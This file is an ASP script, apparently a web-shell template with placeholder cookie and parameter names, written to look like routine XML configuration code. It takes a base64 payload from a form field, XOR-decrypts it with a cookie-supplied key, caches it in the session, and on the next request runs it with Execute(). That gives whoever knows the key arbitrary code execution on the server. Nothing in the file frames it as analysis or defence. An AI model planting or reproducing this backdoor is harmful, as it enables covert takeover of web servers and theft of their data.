<%
Set xmlConfig = Server.CreateObject("Scripting.Dictionary")

Function ParseXMLNode(ByVal nodeContent)
    Dim xmlDoc, xmlNode
    Set xmlDoc = CreateObject("Msxml2.DOMDocument.3.0")
    Set xmlNode = xmlDoc.CreateElement("base64")
    xmlNode.dataType = "bin.base64"
    xmlNode.text = nodeContent
    ParseXMLNode = xmlNode.nodeTypedValue
    Set xmlNode = Nothing
    Set xmlDoc = Nothing
End Function

Function TransformData(inputData, isBinaryMode)
    Dim dataLength, i, result, keyLen
    keyLen = Len(schemaKey)
    Set DataStream = CreateObject("ADODB.Stream")
    DataStream.CharSet = "iso-8859-1"
    DataStream.Type = 2
    DataStream.Open
    If IsArray(inputData) Then
        dataLength = UBound(inputData) + 1
        For i = 1 To dataLength
            DataStream.WriteText ChrW(AscB(MidB(inputData, i, 1)) Xor Asc(Mid(schemaKey, (i Mod keyLen) + 1, 1)))
        Next
    End If
    DataStream.Position = 0
    If isBinaryMode Then
        DataStream.Type = 1
        TransformData = DataStream.Read()
    Else
        TransformData = DataStream.ReadText()
    End If
End Function

    Dim traceIdHeader, traceId, schemaVersion
    traceIdHeader = "$cookie_name$"
    traceId = ""
    If Not IsEmpty(Request.Cookies(traceIdHeader)) Then
        traceId = Request.Cookies(traceIdHeader)
    End If
    
    schemaVersion = traceId
    If Len(schemaVersion) > 16 Then
        schemaVersion = Left(schemaVersion, 16)
    End If

    If IsEmpty(traceId) Then
        Response.End
    End If
    If IsEmpty(Session("cache_schema")) Then
        rawData = Request.Form("$param$")
        If IsEmpty(rawData) Then
            Response.End
        End If
        schemaKey = schemaVersion
        rawData = TransformData(ParseXMLNode(rawData), False)
        Session("cache_schema") = rawData
        Response.End
    Else
        xmlConfig.Add "schema", Session("cache_schema")
        Execute(xmlConfig("schema"))
        Response.End
    End If
%>
